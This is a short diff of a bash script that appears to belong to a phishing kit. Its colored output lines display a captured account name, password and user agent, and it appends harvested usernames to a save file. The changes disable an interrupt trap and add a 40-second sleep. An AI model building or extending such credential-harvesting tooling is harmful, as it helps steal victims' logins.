@@ -5,7 +5,7 @@
 
 
 
-trap 'printf "\n";stop1;exit 1' 2
+#trap 'printf "\n";stop1;exit 1' 2
 
 #server = "FF"
 
@@ -86,8 +86,8 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Agent:\e[0m\e[1;77m %s\n\e[0m" $agent
 cat $server/usernames.txt >> $server/saved.usernames.txt
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.usernames.txt\e[0m\n" $server
-
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.usernames.txt\e[0m\n" $server &
+sleep 40
 stop1
 
 }
